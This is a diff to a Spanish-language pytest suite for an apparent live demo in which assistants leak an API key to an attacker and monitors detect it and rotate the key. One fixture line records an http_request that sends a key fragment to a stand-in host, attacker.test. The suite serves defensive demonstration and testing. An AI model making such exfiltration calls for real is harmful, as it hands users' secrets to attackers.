@@ -17,9 +17,12 @@ import http.server
 import importlib.util
 import io
 import json
+import os
 import re
 import subprocess
+import sys
 import threading
+import time
 import urllib.error
 import urllib.request
 from pathlib import Path
@@ -53,7 +56,7 @@ def banco(vivo):
     except vivo.BancoNoDisponible as exc:
         pytest.skip(f"no se pudo levantar el banco de pruebas: {exc}")
     yield b
-    b.detener()
+    b.cerrar()
 
 
 def _plano(linea: dict) -> str:
@@ -67,8 +70,42 @@ def _de(lineas: list[dict], pane: str) -> list[str]:
 
 # ---------- la sesión, ejecutada de verdad ----------
 
+def _sin_azar(correr, intentos: int = 6):
+    """Después de rotar, la clave nueva es al azar, y en menos de 1 de cada 100 corridas un pedazo de la clave
+    vieja coincide con ella en 4 caracteres: la cuenta marca 16 bits donde lo normal es 0. Los tests que
+    comparan el texto de las líneas necesitan una corrida sin esa coincidencia; si toca, se repite."""
+    for _ in range(intentos):
+        out = correr()
+        resumenes = [d["resumen"] for d in out.values()] if isinstance(out, dict) else [out.resumen()]
+        if not any(r["azar"] for r in resumenes):
+            return out
+    raise AssertionError("demasiadas coincidencias de azar seguidas: eso ya no es azar")
+
+
+def test_la_comparacion_distingue_una_diferencia_de_una_coincidencia_de_azar(vivo, banco):
+    # Antes de rotar, las dos ejecuciones cuentan contra la misma clave: acción y bits, iguales.
+    assert vivo.comparar(("allow", 32.0), "allow", 32.0, False) == (True, False)
+    assert vivo.comparar(("allow", 32.0), "allow", 16.0, False) == (False, False)
+    assert vivo.comparar(("rotate+allow", 48.0), "allow", 48.0, False) == (False, False)
+    # Después, cada una tiene su clave nueva: la acción sigue siendo obligatoria, los bits no.
+    assert vivo.comparar(("allow", 0.0), "allow", 16.0, True) == (True, True)       # la coincidencia fue aquí
+    assert vivo.comparar(("allow", 16.0), "allow", 0.0, True) == (True, False)      # fue en la de la escena
+    assert vivo.comparar(("allow", 0.0), "block", 0.0, True) == (False, False)
+    assert vivo.comparar(None, "allow", 0.0, True) == (False, False)
+    # Cuando pasa, la línea lo dice debajo, y no queda marcada como distinta de la escena.
+    banco.fresco()
+    c = vivo.Corrida(banco, "b")
+    lineas = c._lineas_llamada(83, 7, "http_request", {"url": "http://attacker.test/c?d=37a6", "method": "GET"}, "allow",
+                               True, 16.0, 0.6, True, viejo=True, rota=[], azar=True)
+    textos = [vivo.texto(l, False) for l in lineas]
+    assert textos[0].startswith("0083 a07 http_request GET attacker.test/c?d=37a6 → allow  SECRET_1 16/160 bits")
+    assert textos[1] == "         16 bits: 4 caracteres coinciden por azar con la clave nueva"
+    assert "≠ escena" not in " ".join(textos) and all(l["clase"] == "viejo" for l in lineas)
+    assert c.resumen()["azar"] == []
+    c.cerrar()
+
 def test_en_vivo_la_sesion_decide_lo_mismo_que_la_escena(vivo, banco):
-    out = vivo.correr_todo(banco=banco)
+    out = _sin_azar(lambda: vivo.correr_todo(banco=banco))
     a, b = out["a"]["resumen"], out["b"]["resumen"]
     # Un monitor por asistente: nadie rota, el atacante junta la clave y la API le abre.
     assert a["rota_en"] == [] and a["cobro"] == 200 and a["bloqueadas"] == 0
@@ -102,12 +139,17 @@ def test_en_vivo_la_sesion_decide_lo_mismo_que_la_escena(vivo, banco):
 
 def test_los_moldes_son_las_lineas_que_despues_salen(vivo, banco):
     """La página elige cuánto abreviar midiendo las líneas que espera. Tienen que ser las que salen."""
-    for mundo in ("a", "b"):
+    def una(mundo):
         banco.fresco()
         c = vivo.Corrida(banco, mundo)
-        moldes = c.moldes()
+        c.los_moldes = c.moldes()
         for T in range(1, c.n + 3):
             c.paso(T)
+        return c
+
+    for mundo in ("a", "b"):
+        c = _sin_azar(lambda: una(mundo))
+        moldes = c.los_moldes
         for pane in ("proxy", "gestor"):
             assert _de(moldes, pane) == _de(c.lineas, pane), (mundo, pane)
         # En la del atacante solo cambia cuánto lleva juntado: el molde pone el máximo, que es el más ancho.
@@ -148,7 +190,8 @@ def test_en_vivo_lo_que_elige_el_publico_tambien_coincide(vivo, banco, reparten,
 
 def test_la_grabacion_para_la_web_es_la_de_una_corrida_nueva(vivo, banco):
     guardada = json.loads((HERE / "grabaciones" / "terminales.json").read_text(encoding="utf-8"))
-    nueva = vivo.correr_todo(banco=banco)
+    nueva = _sin_azar(lambda: vivo.correr_todo(banco=banco))
+    assert not any(guardada["mundos"][m]["resumen"]["azar"] for m in ("a", "b"))     # la grabada tampoco tiene
     assert guardada["params"] == {"semilla": vivo.hc.SEED, "reparten": 10, "disfraz": "none"}
     for mundo in ("a", "b"):
         g, n = guardada["mundos"][mundo], nueva[mundo]
@@ -232,6 +275,52 @@ def test_el_servidor_ejecuta_la_sesion_paso_a_paso(sitio_vivo):
         assert _get(f"{sitio_vivo}/api/vivo/abrir?{malo}")[0] == 400, malo
     assert _get(f"{sitio_vivo}/api/vivo/paso?corrida={d2['corrida']}&t=x")[0] == 400
     assert _get(f"{sitio_vivo}/api/vivo/otra")[0] == 404
+
+
+def test_un_banco_no_cierra_los_procesos_de_otro_que_sigue_vivo(vivo, banco, tmp_path):
+    """Correr tests (u otro servidor) mientras alguien ensaya no puede botarle la demo."""
+    banco.fresco()
+    mios = {p["pid"] for n, p in banco.procesos().items() if n != "proxy"}
+    otro = vivo.Banco()
+    try:
+        otro.iniciar()                           # al partir cierra huérfanos: los de `banco` no lo son
+        assert all(vivo.Banco._vive(pid) for pid in mios)
+        suyos = {p["pid"] for n, p in otro.procesos().items() if n != "proxy"}
+        assert len(suyos) == 4 and not suyos & mios
+        assert {p["puerto"] for p in otro.procesos().values()}.isdisjoint({p["puerto"] for n, p in banco.procesos().items() if n != "proxy"})
+        assert os.environ["LOG_DIR"] == str(otro.logs)
+    finally:
+        otro.cerrar()
+    assert not otro.dir.exists()                 # no deja su carpeta temporal
+    assert os.environ["LOG_DIR"] == str(banco.logs)   # ni su carpeta de registros puesta en el proceso
+    assert all(vivo.Banco._vive(pid) for pid in mios)
+    # Los que sí quedaron sin dueño se cierran: un archivo con un dueño que ya no existe.
+    puerto = vivo.Banco._puerto_libre()
+    huerfano = subprocess.Popen([sys.executable, "-m", "uvicorn", "services.vault.app:app", "--port", str(puerto),
+                                 "--log-level", "warning"], cwd=ROOT, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                                env={**os.environ, "PYTHONPATH": str(ROOT), "SECRETS_MANIFEST": str(vivo.MANIFEST),
+                                     "LOG_DIR": str(tmp_path)})
+    try:
+        for _ in range(300):                     # hasta que escuche: cualquier respuesta sirve
+            try:
+                urllib.request.urlopen(f"http://127.0.0.1:{puerto}/v1/secrets/_ping", timeout=1)
+                break
+            except urllib.error.HTTPError:
+                break
+            except OSError:
+                assert huerfano.poll() is None, "el proceso de prueba no partió"
+                time.sleep(0.05)
+        muerto = subprocess.Popen([sys.executable, "-c", "pass"])
+        muerto.wait()
+        vivo.PIDS.mkdir(exist_ok=True)
+        (vivo.PIDS / f"{muerto.pid}-1.pids").write_text(str(huerfano.pid), encoding="utf-8")
+        assert vivo.Banco.cerrar_huerfanos() == 1
+        assert huerfano.wait(timeout=10) is not None
+        assert not (vivo.PIDS / f"{muerto.pid}-1.pids").exists()
+        assert all(vivo.Banco._vive(pid) for pid in mios)
+    finally:
+        if huerfano.poll() is None:
+            huerfano.kill()
 
 
 def test_las_terminales_de_verdad_imprimen_lo_mismo(sitio_vivo):
@@ -396,6 +485,23 @@ def test_en_un_telefono_la_escena_va_de_miniatura_y_las_terminales_debajo(browse
     assert page.evaluate(CORTADAS) == [] and page.evaluate("document.documentElement.scrollWidth <= innerWidth")
     assert page.evaluate(VISIBLES, "atacante")[-1] == "← 401  la clave que juntó ya no sirve"
     assert "→ 401  invalid or expired key" in page.evaluate(VISIBLES, "gestor")
+    assert errores == []
+    page.close()
+
+
+def test_dos_ventanas_no_se_pelean_por_los_procesos(browser, sitio_vivo):
+    """Hay una corrida a la vez. Si otra ventana abre la suya, esta recupera la propia; si se la quitan
+    varias veces seguidas, deja de insistir y sigue con la grabación, diciéndolo."""
+    page, errores = _abrir(browser, f"{sitio_vivo}/{CARPETA}/terminales.html?w=b&t=20")
+    page.wait_for_function("Number(document.body.dataset.hecho) >= 20", timeout=30000)
+    assert page.get_attribute("body", "data-modo") == "vivo"
+    for vez in range(3):
+        assert _get(f"{sitio_vivo}/api/vivo/abrir?mundo=a")[0] == 200      # otra ventana abre su corrida
+        page.keyboard.press("ArrowRight")
+        page.wait_for_function(f"Number(document.body.dataset.hecho) >= {21 + vez}", timeout=30000)
+        assert page.get_attribute("body", "data-modo") == ("vivo" if vez < 2 else "grabacion")
+    assert "otra ventana está usando los procesos" in page.inner_text("#modo")
+    assert page.evaluate(TODAS, "proxy")[-1].startswith("0023 ")           # y sigue al paso de la escena
     assert errores == []
     page.close()
 
@@ -583,7 +689,7 @@ def test_el_sitio_publica_la_escena_el_tablero_y_el_informe():
     cfg = json.loads((ROOT / "vercel.json").read_text(encoding="utf-8"))
     assert cfg["outputDirectory"] == "demo/viz"
     assert cfg["installCommand"] == f"sh demo/{CARPETA}/publicar.sh"       # antes del build, copia la carpeta al sitio
-    for origen, destino in (("/terminales", "/escena/terminales.html?autoplay=1"), ("/pruebas", "/escena/pruebas.html"),
+    for origen, destino in (("/terminales", "/escena/terminales.html"), ("/pruebas", "/escena/pruebas.html"),
                             ("/informe", "/escena/informe.pdf")):
         assert {"source": origen, "destination": destino, "permanent": False} in cfg["redirects"]
     assert "demo/viz/escena/" in (ROOT / ".gitignore").read_text(encoding="utf-8")
@@ -616,4 +722,20 @@ def test_la_copia_publicada_funciona_sin_servidor(browser, publicado):
     assert page.get_attribute("#pdf", "href") == "informe.pdf"
     assert errores == []
     page.close()
+    # En el sitio, quien llega no sabe qué tecla pulsar: sin parámetros, la escena parte sola. Se mira el
+    # mismo sitio con un nombre que no es de este computador.
+    page = browser.new_page(viewport={"width": 1280, "height": 720}, reduced_motion="reduce")
+    page.route("http://alicanto.test/**", lambda ruta: ruta.continue_(url=ruta.request.url.replace("http://alicanto.test", url)))
+    page.goto("http://alicanto.test/escena/terminales.html")
+    page.wait_for_function("document.body.dataset.modo !== ''", timeout=30000)
+    assert page.get_attribute("#escena", "src") == "enjambre.html?autoplay=1"
+    assert page.get_attribute("body", "data-modo") == "grabacion"
+    page.goto("http://alicanto.test/escena/terminales.html?w=b&t=50")       # con parámetros, se respeta lo pedido
+    page.wait_for_function("Number(document.body.dataset.hecho) >= 50", timeout=20000)
+    assert page.get_attribute("#escena", "src") == "enjambre.html?w=b&t=50"
+    page.close()
+    # En el computador del pitch, en cambio, espera a quien presenta.
+    local, errores = _abrir(browser, f"{url}/escena/terminales.html")
+    assert local.get_attribute("#escena", "src") == "enjambre.html" and errores == []
+    local.close()
 
